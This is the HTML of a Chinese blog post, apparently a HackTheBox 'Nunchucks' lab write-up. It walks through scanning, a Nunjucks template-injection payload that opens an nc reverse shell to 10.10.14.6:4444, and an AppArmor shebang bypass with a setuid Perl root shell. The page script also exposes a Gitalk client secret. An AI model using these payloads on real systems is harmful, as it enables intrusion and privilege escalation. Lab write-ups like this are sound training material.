@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Nunchucks - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;414  10.10.11.122                                                                                                              端口扫描22,80,443: 1234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nunchucks - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;414  10.10.11.122                                                                                                              端口扫描22,80,443: 1234">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111001.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111002.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111003.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111004.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111005.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111006.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111007.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111008.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111009.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111010.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111011.jpg">
+<meta property="article:published_time" content="2020-11-10T07:04:12.000Z">
+<meta property="article:modified_time" content="2021-11-10T07:04:55.828Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111001.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/about/"  >
+                <i class="icon icon-lg icon-link"></i>
+                about
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Nunchucks - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Nunchucks - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-11-10T07:04:12.000Z" itemprop="datePublished" class="page-time">
+  2020-11-10
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-11-122"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.11.122</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80-443"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80&#x2F;443</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#vhost"><span class="post-toc-number">3.</span> <span class="post-toc-text">vhost</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#store-nunchucks-htb"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">store.nunchucks.htb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SSTI"><span class="post-toc-number">4.</span> <span class="post-toc-text">SSTI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nunjucks"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">nunjucks</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">5.</span> <span class="post-toc-text">user flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">ssh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">6.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-apparmor-d-usr-bin-perl"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">&#x2F;etc&#x2F;apparmor.d&#x2F;usr.bin.perl</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell-pl"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">shell.pl</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Nunchucks-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Nunchucks - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-11-10 15:04:12" datetime="2020-11-10T07:04:12.000Z"  itemprop="datePublished">2020-11-10</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.com/home/machines/profile/414" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/414</a></p>
+</li>
+<li><h2 id="10-10-11-122"><a href="#10-10-11-122" class="headerlink" title="10.10.11.122"></a>10.10.11.122</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,443:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV -sC 10.10.11.122</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 14:13 CST</span><br><span class="line">Nmap scan report for 10.10.11.122</span><br><span class="line">Host is up (0.073s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)</span><br><span class="line">|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)</span><br><span class="line">|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://nunchucks.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb</span><br><span class="line">| Not valid before: 2021-08-30T15:42:24</span><br><span class="line">|_Not valid after:  2031-08-28T15:42:24</span><br><span class="line">|_http-title: Nunchucks - Landing Page</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http/1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 40.60 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="80-443"><a href="#80-443" class="headerlink" title="80/443"></a>80/443</h2><p>自动跳转域名nunchucks.htb，加hosts访问：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="vhost"><a href="#vhost" class="headerlink" title="vhost"></a>vhost</h1><p>子域名可以扫到一个store：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u https://nunchucks.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="store-nunchucks-htb"><a href="#store-nunchucks-htb" class="headerlink" title="store.nunchucks.htb"></a>store.nunchucks.htb</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>store那里输入邮箱地址接收新闻，根据响应头Express，尝试SSTI：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="nunjucks"><a href="#nunjucks" class="headerlink" title="nunjucks"></a>nunjucks</h2><p>根据文档及名称，发现使用的模板引擎应该是nunjucks：</p>
+<ul>
+<li>Template Engines<br><a href="https://expressjs.com/en/resources/template-engines.html" target="_blank" rel="noopener">https://expressjs.com/en/resources/template-engines.html</a></li>
+<li>mozilla/nunjucks: A powerful templating engine with inheritance, asynchronous control, and more (jinja2 inspired)<br><a href="https://github.com/mozilla/nunjucks" target="_blank" rel="noopener">https://github.com/mozilla/nunjucks</a></li>
+<li>Sandbox Breakout - A View of the Nunjucks Template Engine<br><a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine" target="_blank" rel="noopener">http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</a></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.6 4444 &gt;&#x2F;tmp&#x2F;f&#39;)\&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>David用户目录，user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>写公钥方便后续操作：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">echo &lt;id_rsa.pub&gt; &gt; ~/.ssh/authorized_keys</span><br><span class="line">ssh david@nunchucks.htb</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>linpeas之类可以发现perl设置有cap_setuid：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但并不能直接使用gtfobins方法得到root：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p> 使用apparmor对perl作了限制</p>
+<h2 id="etc-apparmor-d-usr-bin-perl"><a href="#etc-apparmor-d-usr-bin-perl" class="headerlink" title="/etc/apparmor.d/usr.bin.perl"></a>/etc/apparmor.d/usr.bin.perl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug 31 18:25:30 2021</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;perl &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line">  #include &lt;abstractions&#x2F;nameservice&gt;</span><br><span class="line">  #include &lt;abstractions&#x2F;perl&gt;</span><br><span class="line"></span><br><span class="line">  capability setuid,</span><br><span class="line"></span><br><span class="line">  deny owner &#x2F;etc&#x2F;nsswitch.conf r,</span><br><span class="line">  deny &#x2F;root&#x2F;* rwx,</span><br><span class="line">  deny &#x2F;etc&#x2F;shadow rwx,</span><br><span class="line"></span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;id mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;ls mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;cat mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;whoami mrix,</span><br><span class="line">  &#x2F;opt&#x2F;backup.pl mrix,</span><br><span class="line">  owner &#x2F;home&#x2F; r,</span><br><span class="line">  owner &#x2F;home&#x2F;david&#x2F; r,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>很简单的方式，perl运行pl文件会受到限制，但通过SheBang调用perl时，不会受到限制：</p>
+<ul>
+<li>Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmor<br><a href="https://bugs.launchpad.net/apparmor/+bug/1911431" target="_blank" rel="noopener">https://bugs.launchpad.net/apparmor/+bug/1911431</a></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111011.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="shell-pl"><a href="#shell-pl" class="headerlink" title="shell.pl"></a>shell.pl</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(strftime)</span>;</span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(setuid)</span>;</span><br><span class="line">POSIX::setuid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>Template Engines<br><a href="https://expressjs.com/en/resources/template-engines.html" target="_blank" rel="noopener">https://expressjs.com/en/resources/template-engines.html</a></li>
+<li>mozilla/nunjucks: A powerful templating engine with inheritance, asynchronous control, and more (jinja2 inspired)<br><a href="https://github.com/mozilla/nunjucks" target="_blank" rel="noopener">https://github.com/mozilla/nunjucks</a></li>
+<li>Sandbox Breakout - A View of the Nunjucks Template Engine<br><a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine" target="_blank" rel="noopener">http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</a></li>
+<li>perl | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/perl/#capabilities" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></li>
+<li>Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmor<br><a href="https://bugs.launchpad.net/apparmor/+bug/1911431" target="_blank" rel="noopener">https://bugs.launchpad.net/apparmor/+bug/1911431</a></li>
+<li><a href="https://www.hackthebox.com/home/machines/writeup/414" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/writeup/414</a></li>
+<li>HTB: Nunchucks | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-11-10T07:04:55.828Z" itemprop="dateUpdated">2021-11-10 15:04:55</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&title=《Nunchucks - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&title=《Nunchucks - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Nunchucks - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/11/11/Active-HackTheBox/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Active - HackTheBox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/11/09/Academy-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Academy - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
